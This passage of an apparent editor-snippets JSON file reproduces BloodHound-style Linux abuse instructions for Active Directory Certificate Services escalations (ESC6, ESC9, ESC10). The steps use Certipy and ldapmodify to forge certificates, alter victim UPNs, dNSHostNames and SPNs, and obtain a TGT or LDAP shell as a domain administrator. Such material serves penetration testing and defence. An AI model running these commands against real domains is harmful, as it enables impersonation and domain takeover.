            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "- Step 2: Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allow for authentication and permit enrollment agent enrollment.",
            "```sh",
            "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User' -on-behalf-of 'contoso\\administrator' -pfx 'user.pfx'",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the target principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. Choose another target with the given attribute set.",
            "- Step 3: Request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 2.",
            "```sh",
            "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
            "```"
        ]
    },
    "ADCSESC6a linux abuse (bloodhound)": {
        "description": "This entity has the privileges to perform the ADCS ESC6 Scenario A attack against the target domain.The principal has permission to enroll on one or more certificate templates allowing for authentication. They also have enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. The enterprise CA is configured with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag allowing enrollees to specify a Subject Alternate Name (SAN) identifying another principal during certificate enrollment of any published certificate template. This setup allow an attacker principal to obtain a malicious certificate as any AD forest user or computer and use it for authentication and impersonation without knowing their credentials.",
        "prefix": "ADCSESC6a",
        "body": [
            "This entity has the privileges to perform the ADCS ESC6 Scenario A attack against the target domain.The principal has permission to enroll on one or more certificate templates allowing for authentication. They also have enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. The enterprise CA is configured with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag allowing enrollees to specify a Subject Alternate Name (SAN) identifying another principal during certificate enrollment of any published certificate template. This setup allow an attacker principal to obtain a malicious certificate as any AD forest user or computer and use it for authentication and impersonation without knowing their credentials.",
            "To Abuse 'ADCSESC6a' on linux: ",
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Use Certipy to request enrollment in the affected template, specifying the affected enterprise CA and target principal to impersonate:",
            "```sh",
            "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "- Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:",
            "```sh",
            "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
            "```",
            "If the authentication fails then it may be because the DC enforces strong certificate mapping. This requirement can be met by including a URL parameter in the SAN with the target's SID, however not supported by Certipy. See the Windows abuse section for example."
        ]
    },
    "ADCSESC6b linux abuse (bloodhound)": {
        "description": "This entity has the privileges to perform the ADCS ESC6 Scenario B attack against the target domain.The principal has permission to enroll on one or more certificate templates allowing for authentication. They also have enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. The enterprise CA is configured with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag allowing enrollees to specify a Subject Alternate Name (SAN) identifying another principal during certificate enrollment of any published certificate template. This setup allow an attacker principal to obtain a malicious certificate as another principal. There is an affected Domain Controller configured to allow weak certificate mapping enforcement, which enables the attacker principal to authenticate with the malicious certificate and thereby impersonating any AD forest user or computer without their credentials.",
        "prefix": "ADCSESC6b",
        "body": [
            "This entity has the privileges to perform the ADCS ESC6 Scenario B attack against the target domain.The principal has permission to enroll on one or more certificate templates allowing for authentication. They also have enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. The enterprise CA is configured with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag allowing enrollees to specify a Subject Alternate Name (SAN) identifying another principal during certificate enrollment of any published certificate template. This setup allow an attacker principal to obtain a malicious certificate as another principal. There is an affected Domain Controller configured to allow weak certificate mapping enforcement, which enables the attacker principal to authenticate with the malicious certificate and thereby impersonating any AD forest user or computer without their credentials.",
            "To Abuse 'ADCSESC6b' on linux: ",
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate:",
            "```sh",
            "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "- Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:",
            "```sh",
            "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
            "```"
        ]
    },
    "ADCSESC9a linux abuse (bloodhound)": {
        "description": "This entity has the privileges to perform the ADCS ESC9 Scenario A attack against the target domain.The principal has control over a victim principal with permission to enroll on one or more certificate templates, configured to: 1) enable certificate authentication, 2) require the userPrincipalName (UPN) of the enrollee included in the Subject Alternative Name (SAN), and 3) do not have the security extension enabled. The victim also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. There is an affected Domain Controller (DC) configured to allow weak certificate binding enforcement. This setup lets the principal impersonate any AD forest principal (user or computer) without their credentials.The attacker principal can abuse their control over the victim principal to modify the victim\u2019s UPN to match the sAMAccountName of a targeted principal. Example: If the targeted principal is Administrator@corp.local user, the victim's UPN will be populated with \"Administrator\" (without the @corp.local ending). The attacker principal will then abuse their control over the victim principal to obtain the credentials of the victim principal, or a session as the victim principal, and enroll a certificate as the victim in one of the affected certificate templates. The UPN of the victim (\"Administrator\") will be included in the issued certificate under the SAN. As the certificate template does not have the security extension, it will NOT include the SID of the victim user in the issued certificate. Next, the attacker principal will again set the UPN of the victim, this time to an arbitrary string (e.g. the original value). The issued certificate can now be used for authentication against an affected DC. The weak certificate binding configuration on the DC will make the DC accept that the SID of the victim user is not present in the issued certificate when performing Kerberos authentication, and it will use the SAN value to map the certificate to a principal. The DC will attempt to find a principal with a UPN matching the SAN value (\u201cAdministrator\u201d) but as the victim\u2019s UPN has been changed after the enrollment, there will be no principals with this UPN. The DC will then attempt to find a principal with a sAMAccountName matching the SAN value and find the targeted user. At last, the DC issues a Kerberos TGT as the targeted user to the attacker, which means the attacker now has a session as the targeted user. In case the target is a computer, the DC will find it as well as the DC will attempt sAMAccountName matching with a $ at the end of the SAN value as last resort.",
        "prefix": "ADCSESC9a",
        "body": [
            "This entity has the privileges to perform the ADCS ESC9 Scenario A attack against the target domain.The principal has control over a victim principal with permission to enroll on one or more certificate templates, configured to: 1) enable certificate authentication, 2) require the userPrincipalName (UPN) of the enrollee included in the Subject Alternative Name (SAN), and 3) do not have the security extension enabled. The victim also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. There is an affected Domain Controller (DC) configured to allow weak certificate binding enforcement. This setup lets the principal impersonate any AD forest principal (user or computer) without their credentials.The attacker principal can abuse their control over the victim principal to modify the victim\u2019s UPN to match the sAMAccountName of a targeted principal. Example: If the targeted principal is Administrator@corp.local user, the victim's UPN will be populated with \"Administrator\" (without the @corp.local ending). The attacker principal will then abuse their control over the victim principal to obtain the credentials of the victim principal, or a session as the victim principal, and enroll a certificate as the victim in one of the affected certificate templates. The UPN of the victim (\"Administrator\") will be included in the issued certificate under the SAN. As the certificate template does not have the security extension, it will NOT include the SID of the victim user in the issued certificate. Next, the attacker principal will again set the UPN of the victim, this time to an arbitrary string (e.g. the original value). The issued certificate can now be used for authentication against an affected DC. The weak certificate binding configuration on the DC will make the DC accept that the SID of the victim user is not present in the issued certificate when performing Kerberos authentication, and it will use the SAN value to map the certificate to a principal. The DC will attempt to find a principal with a UPN matching the SAN value (\u201cAdministrator\u201d) but as the victim\u2019s UPN has been changed after the enrollment, there will be no principals with this UPN. The DC will then attempt to find a principal with a sAMAccountName matching the SAN value and find the targeted user. At last, the DC issues a Kerberos TGT as the targeted user to the attacker, which means the attacker now has a session as the targeted user. In case the target is a computer, the DC will find it as well as the DC will attempt sAMAccountName matching with a $ at the end of the SAN value as last resort.",
            "To Abuse 'ADCSESC9a' on linux: ",
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Set UPN of victim to targeted principal's sAMAccountName.",
            "Set the UPN of the victim principal using Certipy:",
            "```sh",
            "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -upn Target",
            "```",
            "- Step 2: Check if mail attribute of victim must be set and set it if required.",
            "If the certificate template is of schema version 2 or above and its attribute msPKI-CertificateNameFlag contains the flag SUBJECT_REQUIRE_EMAIL and/or SUBJECT_ALT_REQUIRE_EMAIL then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have\"Subject Require Email\" or \"Subject Alternative Name Require Email\" set to true if any of the flags are present.",
            "If the certificate template is of schema version 1 or does not have any of the email flags, then continue to Step 3.",
            "If any of the two flags are present, you will need the victim\u2019s mail attribute to be set. The value of the attribute will be included in the issues certificate but it is not used to identify the target principal why it can be set to any arbitrary string.",
            "Check if the victim has the mail attribute set using ldapsearch:",
            "```sh",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail",
            "```If the victim has the mail attribute set, continue to Step 3.",
            "If the victim does not has the mail attribute set, set it to a dummy mail using ldapmodify:",
            "```sh",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "- Step 3: Obtain a session as victim.",
            "There are several options for this step.",
            "If the victim is a computer, you can obtain the credentials of the computer account using the Shadow Credentials attack (see [AddKeyCredentialLink edge documentation](https://bloodhound.specterops.io/resources/edges/add-key-credential-link)). Alternatively, you can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see [GenericAll edge documentation](https://bloodhound.specterops.io/resources/edges/generic-all)).",
            "If the victim is a user, you have the following options for obtaining the credentials:Shadow Credentials attack (see [AddKeyCredentialLink edge documentation](https://bloodhound.specterops.io/resources/edges/add-key-credential-link))Password reset (see [ForceChangePassword edge documentation](https://bloodhound.specterops.io/resources/edges/force-change-password))Targeted Kerberoasting (see [WriteSPN edge documentation](https://bloodhound.specterops.io/resources/edges/write-spn))",
            "- Step 4: Enroll certificate as victim.",
            "Use Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:",
            "```sh",
            "certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE",
            "```The issued certificate will be saved to disk with the name of the targeted user.",
            "- Step 5: Set UPN of victim to arbitrary value.",
            "Set the UPN of the victim principal using Certipy:",
            "```sh",
            "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -upn victim@corp.local",
            "```",
            "- Step 6: Perform Kerberos authentication as targeted principal against affected DC using certificate.",
            "Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 4 and the IP of an affected DC:",
            "```sh",
            "certipy auth -pfx TARGET.pfx -dc-ip IP",
            "```"
        ]
    },
    "ADCSESC9b linux abuse (bloodhound)": {
        "description": "This entity has has the privileges to perform the ADCS ESC9 Scenario B attack against the target domain.\n\nThe principal has control over a victim computer with permission to enroll on one or more certificate templates, configured to: 1) enable certificate authentication, 2) require the dNSHostName\u00a0of the enrollee included in the Subject Alternative Name (SAN), and 3) not have the security extension enabled. The victim computer also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. There is an affected Domain Controller (DC) configured to allow weak certificate binding enforcement. This setup lets the principal impersonate any AD forest computer without their credentials.\n\nThe attacker principal can abuse their control over the victim computer to modify the victim computer's dNSHostName attribute to match the dNSHostName of a targeted computer. The attacker principal will then abuse their control over the victim computer to obtain the credentials of the victim computer, or a session as the victim computer, and enroll a certificate as the victim in one of the affected certificate templates. The dNSHostName of the victim will be included in the issued certificate under SAN DNS name. As the certificate template does not have the security extension, the issued certificate will NOT include the SID of the victim computer. DCs with strong certificate binding configuration will require a SID to be present in a certificate used for Kerberos authentication, but the affected DCs with weak certificate binding configuration will not. The affected DCs will split the SAN DNS name into a computer name and a domain name, confirm that the domain name is correct, and use the computer name appended a $ to identify principals with a matching sAMAccountName. At last, the DC issues a Kerberos TGT as the targeted computer to the attacker, which means the attacker now has a session as the targeted computer.",
        "prefix": "ADCSESC9b",
        "body": [
            "This entity has has the privileges to perform the ADCS ESC9 Scenario B attack against the target domain.\n\nThe principal has control over a victim computer with permission to enroll on one or more certificate templates, configured to: 1) enable certificate authentication, 2) require the dNSHostName\u00a0of the enrollee included in the Subject Alternative Name (SAN), and 3) not have the security extension enabled. The victim computer also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. There is an affected Domain Controller (DC) configured to allow weak certificate binding enforcement. This setup lets the principal impersonate any AD forest computer without their credentials.\n\nThe attacker principal can abuse their control over the victim computer to modify the victim computer's dNSHostName attribute to match the dNSHostName of a targeted computer. The attacker principal will then abuse their control over the victim computer to obtain the credentials of the victim computer, or a session as the victim computer, and enroll a certificate as the victim in one of the affected certificate templates. The dNSHostName of the victim will be included in the issued certificate under SAN DNS name. As the certificate template does not have the security extension, the issued certificate will NOT include the SID of the victim computer. DCs with strong certificate binding configuration will require a SID to be present in a certificate used for Kerberos authentication, but the affected DCs with weak certificate binding configuration will not. The affected DCs will split the SAN DNS name into a computer name and a domain name, confirm that the domain name is correct, and use the computer name appended a $ to identify principals with a matching sAMAccountName. At last, the DC issues a Kerberos TGT as the targeted computer to the attacker, which means the attacker now has a session as the targeted computer.",
            "To Abuse 'ADCSESC9b' on linux: ",
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Remove SPNs including dNSHostName on victim.",
            "The SPNs of the victim will be automatically updated when you change the dNSHostName. AD will not allow the same SPN entry to be set on two accounts. Therefore, you must remove any SPN on the victim account that includes the victim's dNSHostName. Remove SPN entries using ldapmodify:",
            "```sh",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\ndelete: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w PWD -h DOMAIN-DNS-NAME",
            "```",
            "- Step 2: Set dNSHostName of victim computer to targeted computer's dNSHostName.",
            "Set the dNSHostName of the victim computer using Certipy:",
            "```sh",
            "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns TARGET.CORP.LOCAL",
            "```",
            "- Step 3: Check if mail attribute of victim must be set and set it if required.",
            "If the certificate template is of schema version 2 or above and its attribute msPKI-CertificateNameFlag contains the flag SUBJECT_REQUIRE_EMAIL and/orSUBJECT_ALT_REQUIRE_EMAIL then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have \"Subject Require Email\" or \"Subject Alternative Name Require Email\" set to true if any of the flags are present.",
            "If the certificate template is of schema version 1 or does not have any of the email flags, then continue to Step 4.",
            "If any of the two flags are present, you will need the victim's mail attribute to be set. The value of the attribute will be included in the issues certificate but it is not used to identify the target computer why it can be set to any arbitrary string.",
            "Check if the victim has the mail attribute set using ldapsearch:",
            "```sh",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail",
            "```If the victim has the mail attribute set, continue to Step 4.",
            "If the victim does not have the mail attribute set, set it to a dummy mail using ldapmodify:",
            "```sh",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "- Step 4: Obtain a session as victim.",
            "There are several options for this step. You can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see [GenericAll edge documentation](https://bloodhound.specterops.io/resources/edges/generic-all))",
            "- Step 5: Enroll certificate as victim.",
            "Use Certipy as the victim computer to request enrollment in the affected template, specifying the affected EnterpriseCA:",
            "```sh",
            "certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE",
            "```The issued certificate will be saved to disk with the name of the targeted computer.",
            "- Step 6 (Optional): Set dNSHostName and SPN of victim to the previous values.",
            "To avoid issues in the environment, set the dNSHostName and SPN of the victim computer back to its previous values using Certipy and ldapmodify:",
            "```sh",
            "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns VICTIM.CORP.LOCAL",
            "```",
            "```sh",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nadd: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w PWD -h DOMAIN-DNS-NAME",
            "```",
            "- Step 7: Perform Kerberos authentication as targeted computer against affected DC using certificate.",
            "Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 4 and the IP of an affected DC:",
            "```sh",
            "certipy auth -pfx TARGET.pfx -dc-ip IP",
            "```"
        ]
    },
    "ADCSESC10a linux abuse (bloodhound)": {
        "description": "This entity has has the privileges to perform the ADCS ESC10 Scenario A attack against the target domain.\n\nThe principal has control over a victim principal with permission to enroll on one or more certificate templates, configured to enable certificate authentication and require the userPrincipalName (UPN) of the enrollee included in the Subject Alternative Name (SAN). The victim also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. There is an affected Domain Controller (DC) configured to allow UPN certificate mapping. This setup lets the principal impersonate any AD forest computer, or any user where UPN does not match their sAMAccountName, without knowing their credentials.\n\nThe attacker principal can abuse their control over the victim principal to modify the victim\u2019s UPN to match the sAMAccountName of a targeted principal followed by @CORP.LOCAL. Example: If the targeted principal is Administrator user of domain CORP.LOCAL, the victim's UPN will be populated with \"Administrator@CORP.LOCAL\". The attacker principal will then abuse their control over the victim principal to obtain the credentials of the victim principal, or a session as the victim principal, and enroll a certificate as the victim in one of the affected certificate templates. The UPN of the victim (\"Administrator@CORP.LOCAL\") will be included in the issued certificate under the SAN. Next, the attacker principal will again set the UPN of the victim, this time to an arbitrary string (e.g. the original value). The issued certificate can now be used for authentication against an affected DC. The UPN certificate mapping configuration on the DC make the DC use the SAN value to map the certificate to a principal when performing Schannel authentication. The DC will attempt to find a principal with a UPN matching the SAN value (\u201cAdministrator@CORP.LOCAL\u201d) but as the victim\u2019s UPN has been changed after the enrollment, there will be no principals with this UPN. The DC will then attempt to find a principal with a sAMAccountName matching the SAN value and find the targeted user. In case the target is a computer, the DC will find it as well as the DC will attempt sAMAccountName matching with a $ at the end of the SAN value as last resort. At last, the DC will authenticate the attacker as the targeted principal.",
        "prefix": "ADCSESC10a",
        "body": [
            "This entity has has the privileges to perform the ADCS ESC10 Scenario A attack against the target domain.\n\nThe principal has control over a victim principal with permission to enroll on one or more certificate templates, configured to enable certificate authentication and require the userPrincipalName (UPN) of the enrollee included in the Subject Alternative Name (SAN). The victim also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. There is an affected Domain Controller (DC) configured to allow UPN certificate mapping. This setup lets the principal impersonate any AD forest computer, or any user where UPN does not match their sAMAccountName, without knowing their credentials.\n\nThe attacker principal can abuse their control over the victim principal to modify the victim\u2019s UPN to match the sAMAccountName of a targeted principal followed by @CORP.LOCAL. Example: If the targeted principal is Administrator user of domain CORP.LOCAL, the victim's UPN will be populated with \"Administrator@CORP.LOCAL\". The attacker principal will then abuse their control over the victim principal to obtain the credentials of the victim principal, or a session as the victim principal, and enroll a certificate as the victim in one of the affected certificate templates. The UPN of the victim (\"Administrator@CORP.LOCAL\") will be included in the issued certificate under the SAN. Next, the attacker principal will again set the UPN of the victim, this time to an arbitrary string (e.g. the original value). The issued certificate can now be used for authentication against an affected DC. The UPN certificate mapping configuration on the DC make the DC use the SAN value to map the certificate to a principal when performing Schannel authentication. The DC will attempt to find a principal with a UPN matching the SAN value (\u201cAdministrator@CORP.LOCAL\u201d) but as the victim\u2019s UPN has been changed after the enrollment, there will be no principals with this UPN. The DC will then attempt to find a principal with a sAMAccountName matching the SAN value and find the targeted user. In case the target is a computer, the DC will find it as well as the DC will attempt sAMAccountName matching with a $ at the end of the SAN value as last resort. At last, the DC will authenticate the attacker as the targeted principal.",
            "To Abuse 'ADCSESC10a' on linux: ",
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Set UPN of victim to targeted principal's sAMAccountName followed by @ and the domain name.",
            "Set the UPN of the victim principal using Certipy:",
            "```sh",
            "certipy account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn Target@CORP.LOCAL",
            "```",
            "- Step 2: Check if mail attribute of victim must be set and set it if required.",
            "If the certificate template is of schema version 2 or above and its attribute msPKI-CertificateNameFlag contains the flag SUBJECT_REQUIRE_EMAIL and/or SUBJECT_ALT_REQUIRE_EMAIL then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have \"Subject Require Email\" or \"Subject Alternative Name Require Email\" set to true if any of the flags are present.",
            "If the certificate template is of schema version 1 or does not have any of the email flags, then continue to Step 3.",
            "If any of the two flags are present, you will need the victim's mail attribute to be set. The value of the attribute will be included in the issues certificate but it is not used to identify the target principal why it can be set to any arbitrary string.",
            "Check if the victim has the mail attribute set using ldapsearch:",
            "```sh",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail",
            "```If the victim has the mail attribute set, continue to Step 3.",
            "If the victim does not has the mail attribute set, set it to a dummy mail using ldapmodify:",
            "```sh",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "- Step 3: Obtain the credentials of victim.",
            "There are several options for this step.",
            "If the victim is a computer, you can obtain the credentials of the computer account using the Shadow Credentials attack (see [AddKeyCredentialLink edge documentation](https://bloodhound.specterops.io/resources/edges/add-key-credential-link)). Alternatively, you can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see [GenericAll edge documentation](https://bloodhound.specterops.io/resources/edges/generic-all)).",
            "If the victim is a user, you have the following options for obtaining the credentials:Shadow Credentials attack (see [AddKeyCredentialLink edge documentation](https://bloodhound.specterops.io/resources/edges/add-key-credential-link))Password reset (see [ForceChangePassword edge documentation](https://bloodhound.specterops.io/resources/edges/force-change-password))Targeted Kerberoasting (see [WriteSPN edge documentation](https://bloodhound.specterops.io/resources/edges/write-spn))",
            "- Step 4: Enroll certificate as victim.",
            "Use Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:",
            "```sh",
            "certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE",
            "```The issued certificate will be saved to disk with the name of the targeted user.",
            "- Step 5: Set UPN of victim to arbitrary value.",
            "Set the UPN of the victim principal using Certipy:",
            "```sh",
            "certipy account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn victim@corp.local",
            "```",
            "- Step 6: Perform Schannel authentication as targeted principal against affected DC using certificate.",
            "Open an LDAP shell as the victim using Certipy by specifying the certificate created in Step 4 and the IP of an affected DC:",
            "```sh",
            "certipy auth -pfx TARGET.pfx -dc-ip IP -ldap-shell",
            "```"
        ]
    },
    "ADCSESC10b linux abuse (bloodhound)": {
        "description": "This entity has has the privileges to perform the ADCS ESC10 Scenario B attack against the target domain.\n\nThe principal has control over a victim computer with permission to enroll on one or more certificate templates, configured to enable certificate authentication, and require the dNSHostName of the enrollee included in the Subject Alternative Name (SAN). The victim computer also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. There is an affected Domain Controller (DC) configured to allow UPN certificate mapping. This setup lets the principal impersonate any AD forest computer without their credentials.\n\nThe attacker principal can abuse their control over the victim computer to modify the victim computer's dNSHostName attribute to match the dNSHostName of a targeted computer. The attacker principal will then abuse their control over the victim computer to obtain the credentials of the victim computer, or a session as the victim computer, and enroll a certificate as the victim in one of the affected certificate templates. The dNSHostName of the victim will be included in the issued certificate under SAN DNS name. The UPN certificate mapping configuration on the affected DCs make it possible to authenticate over Schannel as the targeted computer. The DC will split the SAN DNS name into a computer name and a domain name, confirm that the domain name is correct, and use the computer name appended a $ to identify a computer with matching sAMAccountName which the attacker will be authenticated as.",
        "prefix": "ADCSESC10b",
        "body": [
            "This entity has has the privileges to perform the ADCS ESC10 Scenario B attack against the target domain.\n\nThe principal has control over a victim computer with permission to enroll on one or more certificate templates, configured to enable certificate authentication, and require the dNSHostName of the enrollee included in the Subject Alternative Name (SAN). The victim computer also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. There is an affected Domain Controller (DC) configured to allow UPN certificate mapping. This setup lets the principal impersonate any AD forest computer without their credentials.\n\nThe attacker principal can abuse their control over the victim computer to modify the victim computer's dNSHostName attribute to match the dNSHostName of a targeted computer. The attacker principal will then abuse their control over the victim computer to obtain the credentials of the victim computer, or a session as the victim computer, and enroll a certificate as the victim in one of the affected certificate templates. The dNSHostName of the victim will be included in the issued certificate under SAN DNS name. The UPN certificate mapping configuration on the affected DCs make it possible to authenticate over Schannel as the targeted computer. The DC will split the SAN DNS name into a computer name and a domain name, confirm that the domain name is correct, and use the computer name appended a $ to identify a computer with matching sAMAccountName which the attacker will be authenticated as.",
            "To Abuse 'ADCSESC10b' on linux: ",
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Remove SPNs including dNSHostName on victim.",
            "The SPNs of the victim will be automatically updated when you change the dNSHostName. AD will not allow the same SPN entry to be set on two accounts. Therefore, you must remove any SPN on the victim account that includes the victim's dNSHostName. Remove SPN entries using ldapmodify:",
            "```sh",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\ndelete: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w PWD -h DOMAIN-DNS-NAME",
            "```",
            "- Step 2: Set dNSHostName of victim computer to targeted computer's dNSHostName.",
            "Set the dNSHostName of the victim computer using Certipy:",
            "```sh",
            "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM$$ -dns TARGET.CORP.LOCAL",
            "```",
            "- Step 3: Check if mail attribute of victim must be set and set it if required.",
            "If the certificate template is of schema version 2 or above and its attribute msPKI-CertificateNameFlag contains the flag SUBJECT_REQUIRE_EMAIL and/or SUBJECT_ALT_REQUIRE_EMAIL then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have \"Subject Require Email\" or \"Subject Alternative Name Require Email\" set to true if any of the flags are present.",
            "If the certificate template is of schema version 1 or does not have any of the email flags, then continue to Step 4.",
            "If any of the two flags are present, you will need the victim's mail attribute to be set. The value of the attribute will be included in the issues certificate but it is not used to identify the target principal why it can be set to any arbitrary string.",
            "Check if the victim has the mail attribute set using ldapsearch:",
            "```sh",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail",
            "```If the victim has the mail attribute set, continue to Step 4.",
            "If the victim does not has the mail attribute set, set it to a dummy mail using ldapmodify:",
            "```sh",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "- Step 4: Obtain a session as victim.",
            "= There are several options for this step. You can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see [GenericAll edge documentation](https://bloodhound.specterops.io/resources/edges/generic-all)).",
            "- Step 5: Enroll certificate as victim.",
            "Use Certipy as the victim computer to request enrollment in the affected template, specifying the affected EnterpriseCA:",
            "```sh",
            "certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE",
            "```The issued certificate will be saved to disk with the name of the targeted computer.",
            "- Step 6 (Optional): Set dNSHostName and SPN of victim to the previous values.",
            "To avoid issues in the environment, set the dNSHostName and SPN of the victim computer back to its previous values using Certipy and ldapmodify:",
            "```sh",
            "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns VICTIM.CORP.LOCAL",
            "```",
            "```sh",
